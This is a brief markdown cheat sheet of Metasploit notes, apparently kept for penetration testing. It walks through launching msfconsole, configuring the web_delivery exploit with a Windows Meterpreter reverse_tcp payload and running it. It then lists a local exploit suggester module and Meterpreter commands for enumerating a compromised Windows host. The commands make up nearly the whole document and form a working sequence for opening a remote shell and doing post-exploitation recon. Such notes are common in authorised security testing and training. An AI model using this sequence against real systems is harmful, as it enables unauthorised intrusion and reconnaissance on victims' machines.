# metasploit

### where all modules are located:

```
/usr/share/metasploit-framework/modules
```

### meterpreter

```bash
msfconsole
```

```
use exploit/multi/script/web_delivery
```

```
set payload windows/x64/meterpreter/reverse_tcp
```

```
set target 2
```

```
set LHOST eth0
```

```
run
```

### meterpreter cool stuff

```
post/multi/recon/local_exploit_suggester
```

### meterpreter shell commands

* `sysinfo`
* `getuid`
* `ipconfig`
* `arp`
* `run post/windows/gather/enum_services`
* `run post/windows/gather/enum_applications`
* `route`
* 
